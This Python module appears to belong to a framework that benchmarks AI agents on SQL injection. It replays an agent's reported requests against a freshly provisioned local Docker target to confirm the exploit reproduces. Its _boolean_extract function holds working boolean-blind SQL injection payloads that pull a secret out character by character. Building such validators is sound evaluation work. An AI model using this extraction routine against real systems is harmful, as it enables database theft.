from __future__ import annotations

"""secqurityVali/replay.py - confirm a reported exploit actually reproduces.

An agent that returns the canary has, at that moment, proven it read the secret.
But did it *exploit* the flaw, or did it stumble onto the value once? Replay
settles it: rebuild the target with the SAME structure but a FRESH canary, then
run the agent's own reproduction recipe against it. If the new canary comes
back, the recipe genuinely extracts whatever is in the secret table -- a working
exploit, not a memorised string. If the agent only ever knew the old canary,
its recipe yields nothing here and replay fails.

Two important properties:

  * Same schema, new canary. Only the secret value changes; the table, column,
    endpoint and parameter stay, so a genuine payload (which references those)
    still works, while a memorised canary no longer helps.
  * No agent code runs. The validator itself makes the reproduction's HTTP
    requests from the agent's structured fields -- never a miner-supplied
    script. So replay is safe to drive directly.

execute_reproduction() is the pure HTTP core (testable in-process); run_replay()
wraps it with a fresh target container and is verified on the isolation host.
"""

import dataclasses
import secrets
import subprocess
import time
import urllib.parse
import urllib.request

from secqurityVali import constants as C
from secqurityVali.eval.challenge import Challenge
from secqurityVali.eval.findings import ReproStep
from secqurityVali.targets.sqli_v1.provision import TARGET_IMAGE, TARGET_PORT, docker_env_args


def fresh_canary_challenge(challenge: Challenge) -> Challenge:
    """The same challenge with only the canary changed -- the target for replay.
    A genuine exploit still works against it; a memorised canary does not."""
    return dataclasses.replace(challenge, canary=secrets.token_hex(16))


def execute_reproduction(
    base_url: str,
    steps: list[ReproStep],
    expected_canary: str,
    *,
    timeout: float = 5.0,
) -> bool:
    """Run the agent's reproduction requests against base_url and report whether
    the expected (fresh) canary appears in any response. Pure HTTP; runs no
    agent code."""
    if not steps or not expected_canary:
        return False
    base_url = base_url.rstrip("/")
    for step in steps:
        query = urllib.parse.urlencode(step.query)
        url = f"{base_url}{step.path}"
        try:
            if step.method == "POST":
                req = urllib.request.Request(url, data=query.encode(), method="POST")
                body = urllib.request.urlopen(req, timeout=timeout).read().decode("utf-8", "replace")
            else:
                full = f"{url}?{query}" if query else url
                body = urllib.request.urlopen(full, timeout=timeout).read().decode("utf-8", "replace")
        except Exception:
            continue
        if expected_canary in body:
            return True
    return False


def run_replay(
    challenge: Challenge,
    steps: list[ReproStep],
    *,
    host_port: int = 0,
    timeout_s: int = 30,
) -> bool:
    """Confirm the reproduction against a freshly provisioned target.

    Starts a new target container with the same structure but a fresh canary,
    published to localhost, runs the reproduction, and tears the target down.
    No agent runs here, so the target does not need the monitored runtime -- it
    is our own code serving structured HTTP the validator sends.

    Returns True only if the fresh canary was reproduced. Never raises.
    """
    if not steps:
        return False

    replay_challenge = fresh_canary_challenge(challenge)
    name = "secval-replay-" + secrets.token_hex(6)
    port = host_port or _free_port()

    try:
        run = subprocess.run(
            ["docker", "run", "-d", "--name", name,
             "-p", f"127.0.0.1:{port}:{TARGET_PORT}",
             "--runtime", C.JOB_TARGET_RUNTIME,
             *docker_env_args(replay_challenge), TARGET_IMAGE],
            capture_output=True, text=True, timeout=C.DOCKER_CLI_TIMEOUT_S,
        )
        if run.returncode != 0:
            return False
        base = f"http://127.0.0.1:{port}"
        # Poll until the target actually answers, rather than guessing with a
        # fixed sleep -- a blind re-extraction fires hundreds of requests, and
        # if the first ones hit a not-yet-ready target the extraction comes back
        # partial and replay wrongly fails.
        if not _wait_ready(base):
            return False

        if replay_challenge.variant.startswith("boolean"):
            # A blind variant leaks nothing in any single response, so replaying
            # one request can't recover the canary. Instead the validator itself
            # re-extracts it via boolean blind on the fresh target and checks it
            # matches -- confirming the reported endpoint genuinely reproduces.
            # No agent code runs.
            context = "numeric" if replay_challenge.variant.endswith("numeric") else "string"
            extracted = _boolean_extract(
                base, replay_challenge.vulnerable_endpoint,
                replay_challenge.vulnerable_parameter,
                replay_challenge.secret_table, replay_challenge.secret_column,
                context=context,
            )
            return extracted == replay_challenge.canary

        return execute_reproduction(base, steps, replay_challenge.canary)
    except Exception:
        return False
    finally:
        subprocess.run(["docker", "rm", "--force", "--volumes", name],
                       capture_output=True, timeout=C.DOCKER_CLI_TIMEOUT_S)


def _wait_ready(base_url: str, *, attempts: int = 30, delay: float = 0.5) -> bool:
    """Poll /health until the target answers, so a re-extraction never races a
    not-yet-bound server."""
    url = base_url.rstrip("/") + "/health"
    for _ in range(attempts):
        try:
            with urllib.request.urlopen(url, timeout=2) as resp:
                if resp.status == 200:
                    return True
        except Exception:
            pass
        time.sleep(delay)
    return False


_HEX = "0123456789abcdef"


def _boolean_extract(base_url, endpoint, param, table, column, *,
                     context="string", length=32, timeout=5.0) -> str:
    """Validator-side boolean-blind extraction of the secret, using the known
    schema. Reconstructs the canary char by char from true/false answers. The
    injection prefix matches the context (string or numeric)."""
    base_url = base_url.rstrip("/")
    prefix = "0 OR" if context == "numeric" else "zzz' OR"

    import json

    def btest(condition: str) -> bool:
        payload = f"{prefix} ({condition})-- -"
        url = f"{base_url}{endpoint}?" + urllib.parse.urlencode({param: payload})
        # A transient network hiccup mid-extraction must not be read as "false"
        # (that would silently corrupt the recovered canary), so retry briefly.
        for attempt in range(3):
            try:
                body = urllib.request.urlopen(url, timeout=timeout).read()
                return bool(json.loads(body).get("found"))
            except Exception:
                time.sleep(0.3)
        return False

    subquery = f'SELECT "{column}" FROM "{table}" LIMIT 1'
    out = ""
    for i in range(1, length + 1):
        ch = None
        for c in _HEX:
            if btest(f"substr(({subquery}),{i},1)='{c}'"):
                ch = c
                break
        if ch is None:
            break
        out += ch
    return out


def _free_port() -> int:
    import socket
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port
